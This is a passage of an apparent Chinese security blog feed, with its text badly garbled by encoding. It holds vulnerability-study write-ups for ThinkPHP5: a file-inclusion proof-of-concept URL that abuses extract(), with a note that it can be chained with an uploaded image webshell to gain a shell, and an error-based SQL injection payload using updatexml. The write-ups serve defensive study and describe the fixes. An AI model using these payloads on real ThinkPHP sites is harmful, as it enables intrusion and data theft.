"></a>é’ˆå¯¹ä¸ªäººç§»åŠ¨ç»ˆç«¯æ”»å‡»æ˜¾è‘—å¢åŠ </h3><ul><li>iOSã€Android</li><li>ç³»ç»Ÿæ¼æ´ã€ç¤¾ä¼šå·¥ç¨‹å­¦</li><li>å…¸å‹ä¾‹å­ï¼šâ€œä¸‰å‰æˆŸæ¼æ´â€</li></ul><h2 id="å…¸å‹çš„APTç»„ç»‡æœºæ„"><a href="#å…¸å‹çš„APTç»„ç»‡æœºæ„" class="headerlink" title="å…¸å‹çš„APTç»„ç»‡æœºæ„"></a>å…¸å‹çš„APTç»„ç»‡æœºæ„</h2><h3 id="æ–¹ç¨‹å¼"><a href="#æ–¹ç¨‹å¼" class="headerlink" title="æ–¹ç¨‹å¼"></a>æ–¹ç¨‹å¼</h3><h3 id="ç´¢ä¼¦ä¹‹çœ¼"><a href="#ç´¢ä¼¦ä¹‹çœ¼" class="headerlink" title="ç´¢ä¼¦ä¹‹çœ¼"></a>ç´¢ä¼¦ä¹‹çœ¼</h3><h3 id="APT28"><a href="#APT28" class="headerlink" title="APT28"></a>APT28</h3><h3 id="Lazarus"><a href="#Lazarus" class="headerlink" title="Lazarus"></a>Lazarus</h3><h3 id="Group123"><a href="#Group123" class="headerlink" title="Group123"></a>Group123</h3><h2 id="å½“ç„¶è¿˜æœ‰å¾ˆå¤šç³»ç»Ÿçº§åˆ«çš„æ¼æ´ï¼Œè¿™é‡Œä¸ºä»€ä¹ˆç»å¸¸ç”¨åˆ°çš„éƒ½æ˜¯Officeç›¸å…³çš„ï¼Œæˆ‘ä¸ªäººè®¤ä¸ºæ˜¯APTéœ€è¦å‰æœŸå¤§é‡çš„é±¼å‰æ”»å‡»æ¥è·å–çœŸå®çš„ç›®æ ‡ä¿¡æ¯ï¼Œè€ŒOfficeåœ¨å¤§éƒ¨åˆ†æ”»å‡»ç›®æ ‡çš„æœºå™¨ä¸Šåº”è¯¥éƒ½æœ‰ï¼Œä½œç”¨èŒƒå›´æ¯”è¾ƒå¤§ï¼ŒæˆåŠŸç‡é«˜çš„åŸå› å§ã€‚"><a href="#å½“ç„¶è¿˜æœ‰å¾ˆå¤šç³»ç»Ÿçº§åˆ«çš„æ¼æ´ï¼Œè¿™é‡Œä¸ºä»€ä¹ˆç»å¸¸ç”¨åˆ°çš„éƒ½æ˜¯Officeç›¸å…³çš„ï¼Œæˆ‘ä¸ªäººè®¤ä¸ºæ˜¯APTéœ€è¦å‰æœŸå¤§é‡çš„é±¼å‰æ”»å‡»æ¥è·å–çœŸå®çš„ç›®æ ‡ä¿¡æ¯ï¼Œè€ŒOfficeåœ¨å¤§éƒ¨åˆ†æ”»å‡»ç›®æ ‡çš„æœºå™¨ä¸Šåº”è¯¥éƒ½æœ‰ï¼Œä½œç”¨èŒƒå›´æ¯”è¾ƒå¤§ï¼ŒæˆåŠŸç‡é«˜çš„åŸå› å§ã€‚" class="headerlink" title="å½“ç„¶è¿˜æœ‰å¾ˆå¤šç³»ç»Ÿçº§åˆ«çš„æ¼æ´ï¼Œè¿™é‡Œä¸ºä»€ä¹ˆç»å¸¸ç”¨åˆ°çš„éƒ½æ˜¯Officeç›¸å…³çš„ï¼Œæˆ‘ä¸ªäººè®¤ä¸ºæ˜¯APTéœ€è¦å‰æœŸå¤§é‡çš„é±¼å‰æ”»å‡»æ¥è·å–çœŸå®çš„ç›®æ ‡ä¿¡æ¯ï¼Œè€ŒOfficeåœ¨å¤§éƒ¨åˆ†æ”»å‡»ç›®æ ‡çš„æœºå™¨ä¸Šåº”è¯¥éƒ½æœ‰ï¼Œä½œç”¨èŒƒå›´æ¯”è¾ƒå¤§ï¼ŒæˆåŠŸç‡é«˜çš„åŸå› å§ã€‚"></a>å½“ç„¶è¿˜æœ‰å¾ˆå¤šç³»ç»Ÿçº§åˆ«çš„æ¼æ´ï¼Œè¿™é‡Œä¸ºä»€ä¹ˆç»å¸¸ç”¨åˆ°çš„éƒ½æ˜¯Officeç›¸å…³çš„ï¼Œæˆ‘ä¸ªäººè®¤ä¸ºæ˜¯APTéœ€è¦å‰æœŸå¤§é‡çš„é±¼å‰æ”»å‡»æ¥è·å–çœŸå®çš„ç›®æ ‡ä¿¡æ¯ï¼Œè€ŒOfficeåœ¨å¤§éƒ¨åˆ†æ”»å‡»ç›®æ ‡çš„æœºå™¨ä¸Šåº”è¯¥éƒ½æœ‰ï¼Œä½œç”¨èŒƒå›´æ¯”è¾ƒå¤§ï¼ŒæˆåŠŸç‡é«˜çš„åŸå› å§ã€‚</h2><p><em>XMind - Trial Version</em></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;img src=&quot;https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200922011215.png&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;ã€Šé€è§†APTã€‹&quot;&gt;&lt;a href=&quot;#ã€Šé€è§†APTã€‹&quot; class=&quot;hea</summary>
      
    
    
    
    
    <category term="APT" scheme="https://hack-for.fun/tags/APT/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5æ¼æ´å­¦ä¹ -æ–‡ä»¶åŒ…å«æ¼æ´</title>
    <link href="https://hack-for.fun/8d0f.html"/>
    <id>https://hack-for.fun/8d0f.html</id>
    <published>2020-09-16T05:10:50.000Z</published>
    <updated>2020-09-16T15:59:09.731Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h2 id="ThinkPHP5æ–‡ä»¶åŒ…å«æ¼æ´"><a href="#ThinkPHP5æ–‡ä»¶åŒ…å«æ¼æ´" class="headerlink" title="ThinkPHP5æ–‡ä»¶åŒ…å«æ¼æ´"></a>ThinkPHP5æ–‡ä»¶åŒ…å«æ¼æ´</h2><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;public&#x2F;index.php&#x2F;index&#x2F;index?cacheFile&#x3D;favicon.ico</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916231827.png" alt="image-20200916135216791"></p><p>å¯é…åˆæ–‡ä»¶ä¸Šä¼ å›¾ç‰‡é©¬ï¼ŒGetShellã€‚(PHP æ–‡ä»¶åŒ…å«éƒ½è®²æ–‡ä»¶å½“åšphpåç¼€æ–‡ä»¶è¿›è¡Œè§£æï¼Œä¸å®é™…æ–‡ä»¶ç±»å‹æ— å…³)</p><h2 id="æ¼æ´æ¦‚è¿°"><a href="#æ¼æ´æ¦‚è¿°" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><p>æ¼æ´å­˜åœ¨äº <strong>ThinkPHP</strong> æ¨¡æ¿å¼•æ“ä¸­ï¼Œåœ¨åŠ è½½æ¨¡ç‰ˆè§£æå˜é‡æ—¶å­˜åœ¨<strong>å˜é‡è¦†ç›–</strong>é—®é¢˜ï¼Œè€Œä¸”ç¨‹åºæ²¡æœ‰å¯¹æ•°æ®è¿›è¡Œå¾ˆå¥½çš„è¿‡æ»¤ï¼Œæœ€ç»ˆå¯¼è‡´ <strong>æ–‡ä»¶åŒ…å«æ¼æ´</strong> çš„äº§ç”Ÿã€‚</p><ul><li>å˜é‡è¦†ç›–æ¼æ´</li></ul><p><a href="https://www.cnblogs.com/wangtanzhi/p/12748967.html">https://www.cnblogs.com/wangtanzhi/p/12748967.html</a></p><p><strong>å¦‚æœæ²¡æœ‰æŒ‡å®š flagsï¼Œåˆ™è¢«å‡å®šä¸º EXTR_OVERWRITEã€‚</strong></p><p>ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">$auth = <span class="string">&#x27;0&#x27;</span>;</span><br><span class="line">extract($_GET)ï¼›</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($auth==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;private!&quot;</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;public!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>è¿™ç§æƒ…å†µæ²¡æœ‰æŒ‡å®š flagsï¼Œåˆ™è¢«å‡å®šä¸º EXTR_OVERWRITE</strong></p><p>å‡è®¾ç”¨æˆ·æ„é€ ä»¥ä¸‹é“¾æ¥ï¼š<a href="http://www.a.com/test1.php?auth=1">http://www.a.com/test1.php?auth=1</a><br>ç•Œé¢ä¸Šä¼šæ‰“å°å‡ºprivateï¼</p><p>å®‰å…¨çš„åšæ³•æ˜¯ç¡®å®šregister_globals=OFFåï¼Œåœ¨è°ƒç”¨extract()æ—¶ä½¿ç”¨EXTR_SKIPä¿è¯å·²æœ‰å˜é‡ä¸ä¼šè¢«è¦†ç›–ã€‚<br>ps:<br>PHP extract() å‡½æ•°ä»æ•°ç»„ä¸­æŠŠå˜é‡å¯¼å…¥åˆ°å½“å‰çš„ç¬¦å·è¡¨ä¸­ã€‚å¯¹äºæ•°ç»„ä¸­çš„æ¯ä¸ªå…ƒç´ ï¼Œé”®åç”¨äºå˜é‡åï¼Œé”®å€¼ç”¨äºå˜é‡å€¼ã€‚</p><h2 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p><strong>5.0.0&lt;=ThinkPHP5&lt;=5.0.18</strong> ã€<strong>5.1.0&lt;=ThinkPHP&lt;=5.1.10</strong> </p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><p>è¿™é‡Œä»¥<code>ThinkPHP 5.0.18</code>  è¿›è¡Œåˆ†æã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916184327.png" alt="image-20200916153529187"></p><p>åœ¨å†å²<code>Releases</code> ä¿¡æ¯ä¸­ï¼Œæ‰¾åˆ°äº† <code>5.0.19</code> ä¸­ï¼Œæ”¹è¿›äº† æ¨¡æ¿å¼•æ“çš„ä¸€å¤„å¯èƒ½çš„å®‰å…¨éšæ‚£ã€‚</p><p><code>/library/think/template/driver/File.php</code> ä¸­çš„ <code>File</code> ç±»ä¸­çš„<code>read</code> æ–¹æ³•ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185031.png" alt="image-20200916161144712"></p><ul><li>ç”¨æˆ·Getæäº¤çš„æ•°æ®éƒ½ä¼šé€šè¿‡<code>input</code> æ–¹æ³•è·å–æ•°æ®ï¼Œç„¶åé€šè¿‡<code>filterValue</code> æ–¹æ³•è¿›è¡Œè¿‡æ»¤å’Œå¼ºåˆ¶ç±»å‹è½¬æ¢ã€‚</li><li>åœ¨ä¿®æ”¹åçš„ä»£ç ä¸‹æ–­ç‚¹ï¼Œç„¶åçœ‹æ–¹æ³•è°ƒç”¨å’Œå‚æ•°ä¼ é€’ã€‚å¦‚ä¸‹å›¾ï¼š</li></ul><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185043.png" alt="image-20200916163325855"></p><p>åœ¨<code>../application/index/index/controller/index.php</code> ä¸­ï¼Œä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"><span class="keyword">use</span> <span class="title">think</span>\<span class="title">Controller</span>;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span> <span class="keyword">extends</span> <span class="title">Controller</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;assign(request()-&gt;get());</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;fetch(); <span class="comment">// å½“å‰æ¨¡å—/é»˜è®¤è§†å›¾ç›®å½•/å½“å‰æ§åˆ¶å™¨ï¼ˆå°å†™ï¼‰/å½“å‰æ“ä½œï¼ˆå°å†™ï¼‰.html</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ç”¨æˆ·è¾“å…¥çš„æ•°æ®è¢«<code>get</code>æ–¹æ³•è·å–ï¼Œç„¶åè°ƒç”¨äº†<code>input</code>æ–¹æ³•å’Œé€’å½’è°ƒç”¨<code>filterValue</code> æ–¹æ³•ï¼Œå¹¶ä¸”è¯¥æ–¹æ³•è¿˜ä¼šç»§ç»­è°ƒç”¨<code>filterExp</code> æ–¹æ³•å¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œè¿‡æ»¤ï¼Œç„¶åè¿”å›ç»™<code>$data</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185108.png" alt="image-20200916165017001"></p><p>ç„¶åå†è°ƒç”¨<code>assign</code> æ–¹æ³•ï¼Œè¿”å›å¤„ç†åçš„æ•°æ®ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185121.png" alt="image-20200916171205436"></p><p>å› æ­¤ç”¨æˆ·çš„æ•°æ®è¾“å…¥ï¼Œç»è¿‡<code>get</code>æ–¹æ³•å’Œ<code>assign</code>æ–¹æ³•åï¼Œè¿”å›çš„å†…å®¹ä¸º<code>cacheFile=favico.ico</code> ï¼Œç„¶åç¨‹åºç»§ç»­è°ƒç”¨<code>fetch</code>æ–¹æ³•è¿›è¡Œå¤„ç†ã€‚</p><blockquote><p>fetchæ–¹æ³•ç”¨äºåŠ è½½æ¨¡æ¿è¾“å‡ºã€‚è¿™é‡Œå¦‚æœæˆ‘ä»¬æ²¡æœ‰æŒ‡å®šæ¨¡æ¿åç§°ï¼Œå…¶ä¼šä½¿ç”¨é»˜è®¤çš„æ–‡ä»¶ä½œä¸ºæ¨¡æ¿ï¼Œæ¨¡æ¿è·¯å¾„ç±»ä¼¼ <strong>å½“å‰æ¨¡å—/é»˜è®¤è§†å›¾ç›®å½•/å½“å‰æ§åˆ¶å™¨ï¼ˆå°å†™ï¼‰/å½“å‰æ“ä½œï¼ˆå°å†™ï¼‰.html</strong> ï¼Œå¦‚æœé»˜è®¤è·¯å¾„æ¨¡æ¿ä¸å­˜åœ¨ï¼Œç¨‹åºå°±ä¼šæŠ¥é”™ã€‚</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185135.png" alt="image-20200916183120261"></p><p>è·Ÿè¿›åˆ° <strong>Template</strong> ç±»çš„ <strong>fetch</strong> æ–¹æ³•ï¼Œå¯ä»¥å‘ç°å¯æ§å˜é‡ <strong>$vars</strong> èµ‹å€¼ç»™ <strong>$this-&gt;data</strong> å¹¶æœ€ç»ˆä¼ å…¥ <strong>File</strong> ç±»çš„ <strong>read</strong> æ–¹æ³•ã€‚è€Œ <strong>read</strong> æ–¹æ³•ä¸­åœ¨ä½¿ç”¨äº† <strong>extract</strong> å‡½æ•°åï¼Œç›´æ¥åŒ…å«äº† <strong>$cacheFile</strong> å˜é‡ã€‚è¿™é‡Œå°±æ˜¯æ¼æ´å‘ç”Ÿçš„å…³é”®åŸå› ï¼ˆå¯ä»¥é€šè¿‡ <strong>extract</strong> å‡½æ•°ï¼Œç›´æ¥è¦†ç›– <strong>$cacheFile</strong> å˜é‡ï¼Œå› ä¸º <strong>extract</strong> å‡½æ•°ä¸­çš„å‚æ•° <strong>$vars</strong> å¯ä»¥ç”±ç”¨æˆ·æ§åˆ¶ï¼‰ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185154.png" alt="image-20200916184005912"></p><p>æ–¹æ³•è°ƒç”¨æ ˆï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185205.png" alt="image-20200916184215051"></p><h2 id="åˆ©ç”¨æ€»ç»“"><a href="#åˆ©ç”¨æ€»ç»“" class="headerlink" title="åˆ©ç”¨æ€»ç»“"></a>åˆ©ç”¨æ€»ç»“</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185135.png" alt="image-20200916183120261"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185825.png" alt="7"></p><h2 id="æ¼æ´ä¿®å¤"><a href="#æ¼æ´ä¿®å¤" class="headerlink" title="æ¼æ´ä¿®å¤"></a>æ¼æ´ä¿®å¤</h2><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200916185031.png" alt="image-20200916161144712"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;[toc]&lt;/p&gt;
&lt;h2 id=&quot;ThinkPHP5æ–‡ä»¶åŒ…å«æ¼æ´&quot;&gt;&lt;a href=&quot;#ThinkPHP5æ–‡ä»¶åŒ…å«æ¼æ´&quot; class=&quot;headerlink&quot; title=&quot;ThinkPHP5æ–‡ä»¶åŒ…å«æ¼æ´&quot;&gt;&lt;/a&gt;ThinkPHP5æ–‡ä»¶åŒ…å«æ¼æ´&lt;/h2&gt;&lt;h2 id=&quot;</summary>
      
    
    
    
    
    <category term="æ–‡ä»¶åŒ…å«" scheme="https://hack-for.fun/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"/>
    
    <category term="ä»£ç å®¡è®¡" scheme="https://hack-for.fun/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>ThinkPHP5æ¼æ´å­¦ä¹ -SQLæ³¨å…¥</title>
    <link href="https://hack-for.fun/69fea760.html"/>
    <id>https://hack-for.fun/69fea760.html</id>
    <published>2020-09-13T05:40:27.000Z</published>
    <updated>2020-09-23T03:04:24.409Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><p>å‚è€ƒèµ„æ–™ï¼š<a href="https://github.com/Mochazz/ThinkPHP-Vuln">https://github.com/Mochazz/ThinkPHP-Vuln</a></p><p>ç¯å¢ƒå‡†å¤‡ï¼š</p><ul><li>PHPStorm + MAMP PRO</li></ul><p>ç¯å¢ƒæ­å»ºå¯ä»¥çœ‹æˆ‘å‰ä¸¤ç¯‡æ–‡ç« ã€‚</p><ul><li>composer</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">brew install composer</span><br><span class="line">composer config -g repo.packagist composer https:&#x2F;&#x2F;mirrors.aliyun.com&#x2F;composer&#x2F;</span><br></pre></td></tr></table></figure><ul><li>è·å–å¤ç°ä»£ç </li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">composer create-project --prefer-dist topthink&#x2F;think&#x3D;5.0.15 tpdemo</span><br></pre></td></tr></table></figure><p>å°† <strong>composer.json</strong> æ–‡ä»¶çš„ <strong>require</strong> å­—æ®µè®¾ç½®æˆå¦‚ä¸‹ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&quot;require&quot;: &#123;</span><br><span class="line">    &quot;php&quot;: &quot;&gt;&#x3D;5.4.0&quot;,</span><br><span class="line">    &quot;topthink&#x2F;framework&quot;: &quot;5.0.15&quot;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>SQL æ³¨å…¥demo ç¯å¢ƒ</li></ul><p>ä¿®æ”¹<code>/application/index/controller/index.php</code> çš„ä»£ç å¦‚ä¸‹ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">app</span>\<span class="title">index</span>\<span class="title">controller</span>;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Index</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">index</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $username = request()-&gt;get(<span class="string">&#x27;username/a&#x27;</span>);</span><br><span class="line">        db(<span class="string">&#x27;users&#x27;</span>)-&gt;insert([<span class="string">&#x27;username&#x27;</span> =&gt; $username]);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;Update success&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>æ¨¡æ‹Ÿè¿™é‡Œå­˜åœ¨ä¸€ä¸ªç”¨æˆ·ä¼ å‚å¹¶ä¸æ•°æ®åº“äº¤äº’çš„åœºæ™¯ã€‚</p></blockquote><p>å¯èƒ½ä¼šå­˜åœ¨ï¼ŒSQL æŠ¥é”™</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913191229.png" alt="image-20200913135221064"></p><p>ä¿®æ”¹username å­—æ®µé»˜è®¤ä¸º<code>NULL</code>  å³å¯è§£å†³é—®é¢˜ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913191250.png" alt="image-20200913134825568"></p><h1 id="SQLæ³¨å…¥ä¸€-insert"><a href="#SQLæ³¨å…¥ä¸€-insert" class="headerlink" title="SQLæ³¨å…¥ä¸€(insert)"></a>SQLæ³¨å…¥ä¸€(insert)</h1><h2 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public&#x2F;index&#x2F;index?username[0]&#x3D;inc&amp;username[1]&#x3D;updatexml(1,concat(0x7,user(),0x7e),1)&amp;username[2]&#x3D;1 </span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913191832.png" alt="image-20200913134332556"></p><h2 id="å½±å“ç‰ˆæœ¬"><a href="#å½±å“ç‰ˆæœ¬" class="headerlink" title="å½±å“ç‰ˆæœ¬"></a>å½±å“ç‰ˆæœ¬</h2><p><strong>5.0.13&lt;=ThinkPHP&lt;=5.0.15</strong> ã€ <strong>5.1.0&lt;=ThinkPHP&lt;=5.1.5</strong></p><h2 id="æ¼æ´æ¦‚è¿°"><a href="#æ¼æ´æ¦‚è¿°" class="headerlink" title="æ¼æ´æ¦‚è¿°"></a>æ¼æ´æ¦‚è¿°</h2><p>æœ¬æ¬¡æ¼æ´å­˜åœ¨äº <strong>Builder</strong> ç±»çš„ <strong>parseData</strong> æ–¹æ³•ä¸­ã€‚ç”±äºç¨‹åºæ²¡æœ‰å¯¹æ•°æ®è¿›è¡Œå¾ˆå¥½çš„è¿‡æ»¤ï¼Œå°†æ•°æ®æ‹¼æ¥è¿› <strong>SQL</strong> è¯­å¥ï¼Œå¯¼è‡´ <strong>SQLæ³¨å…¥æ¼æ´</strong> çš„äº§ç”Ÿã€‚</p><p>ç±»å‹ï¼š<code>insert</code> æ³¨å…¥ã€‚</p><h2 id="æ¼æ´åˆ†æ"><a href="#æ¼æ´åˆ†æ" class="headerlink" title="æ¼æ´åˆ†æ"></a>æ¼æ´åˆ†æ</h2><blockquote><p>å¯¹äºå¼€æºé¡¹ç›®ï¼Œåœ¨issue æˆ–è€… commit \ Releases è®°å½•ä¸­ï¼Œå°±èƒ½æ‰¾åˆ°å†å²æ¼æ´ä¿¡æ¯ã€‚è¿™ä¸€ç‚¹åœ¨CTFä¸­ç»å¸¸ç”¨åˆ°ï¼Œå°¤å…¶æ˜¯Node.js çš„ç¬¬ä¸‰æ–¹ä¾èµ–æ¼æ´ã€‚</p></blockquote><p>ä»æ¼æ´å½±å“ç‰ˆæœ¬å¯ä»¥å»æ‰¾ å·²ç»ä¿®å¤åçš„ç‰ˆæœ¬ï¼Œ<a href="https://github.com/top-think/framework/releases/tag/v5.0.16">https://github.com/top-think/framework/releases/tag/v5.0.16</a></p><p>é€šè¿‡github çš„<code>compare</code>åŠŸèƒ½ï¼Œå³å¯æŸ¥çœ‹ä»£ç å‘ç”Ÿäº†å“ªäº›ä¿®æ”¹ã€‚</p><p><a href="https://github.com/top-think/framework/compare/v5.0.16...master">https://github.com/top-think/framework/compare/v5.0.16...master</a></p><p>åœ¨<code>/thinkphp/library/think/db/Connection.php</code> çš„ 314ï¼Œ 316 è¡Œä¸‹æ–­ç‚¹Debugï¼Œæ‰“payloadã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913191848.png" alt="image-20200913141903209"></p><p>INSERT INTO <code>users</code> (<code>username</code>) VALUES (updatexml(1,concat(0x7,user(),0x7e),1)+1) </p><p>åŒæ—¶æˆåŠŸæ”»å‡»çš„Payload æ‰€åœ¨çš„å‚æ•°ä½äº <code>username[1]</code> çš„ <code>value</code>  ã€‚</p><p>æ”»å‡»Payload ç»è¿‡ThinkPHP çš„å†…ç½®è¿‡æ»¤åï¼Œè¿›å…¥<code>$this-&gt;builder</code> çš„<code>Query</code> ç±»çš„<code>insert</code> æ–¹æ³•ï¼Œæ‰§è¡Œå…¶ä¸­çš„SQLè¯­å¥ï¼Œå¹¶åœ¨åé¢è¿”å›å‡ºäº†æ‰§è¡Œç»“æœã€‚å› ä¸ºPayloadåˆ©ç”¨<code>updatexml()</code>æ¥æŠ¥é”™ï¼Œå› æ­¤å¿…é¡»å¼€å¯<code>app_debug</code> æ¥å¼€å¯SQL æŠ¥é”™ä¿¡æ¯ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192007.png" alt="image-20200913155142684"></p><p>(å¦‚ä¸Šå›¾debug ç»“æœä¸­Query.phpï¼‰ï¼Œ<code>$this-&gt;builder</code> ä¸º <code>think\db\builder\Mysql</code> ç±»ï¼Œ<code>Query</code> çš„å®šä¹‰ä½äº <code>thinkphp/library/think/db/builder/Mysql.php</code> </p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192026.png" alt="image-20200913161424839"></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192043.png" alt="image-20200913161552092"></p><p>åœ¨<code>/thinkphp/library/think/db/builder/Mysql.php</code> , <code>Mysql</code> ç±»ç»§æ‰¿äº<code>Builder</code> ç±»ï¼Œå³ä¸Šé¢çš„ <strong>$this-&gt;builder-&gt;insert()</strong> æœ€ç»ˆè°ƒç”¨çš„æ˜¯ <strong>Builder</strong> ç±»çš„ <strong>insert</strong> æ–¹æ³•</p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192059.png" alt="image-20200913162209236"></p><p>æ–¹æ³•è°ƒç”¨<code>parseData()</code>æ–¹æ³•æ¥åˆ†æå¹¶å¤„ç†æ•°æ®ï¼Œè·Ÿè¿›è¯¥æ–¹æ³•ã€‚</p><p><code>/thinkphp/library/think/db/Builder.php</code> </p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913193005.png" alt="image-20200913163148214"></p><p>åœ¨<code>inc</code> å’Œ <code>dec</code> çš„ æƒ…å†µä¸‹ï¼Œå°†å¯æ§æ•°æ®<code>$val[1]</code>é€šè¿‡<code>parseKey</code>æ–¹æ³•å¤„ç†åï¼Œè¿›è¡Œæ‹¼æ¥ï¼Œå¹¶è¿”å›<code>$result</code></p><p><img src="https://cdn.jsdelivr.net/gh/ifonly-go2019/PicGo//images/20200913192945.png" alt="image-20200913185951795"></p><p><code>parseKey</code>æ–¹æ³• ä¸åšä»»ä½•å¤„ç†ï¼Œæ˜¯ç›´æ¥è¿”å›å€¼çš„ä¸€ä¸ªæ–¹æ³•ã€‚</p><blockquote><p>å› æ­¤ï¼Œå¸¦æœ‰æ¶æ„SQL è¯­å¥çš„Payloadï¼Œè¢«æ‹¼æ¥ä¸”æ²¡ä»»ä½•å­—ç¬¦ä¸²å½¢å¼å¤„ç†åœ¨Builderç±»çš„insertæ–¹æ³•ä¸­ï¼Œé€šè¿‡str_replaceå‡½æ•°ç›´æ¥æ›¿æ¢ï¼Œè¿”å›sqlï¼Œå¸¦å…¥SQLè¯­å¥ä¸­è¢«æ‰§è¡Œï¼Œé€ 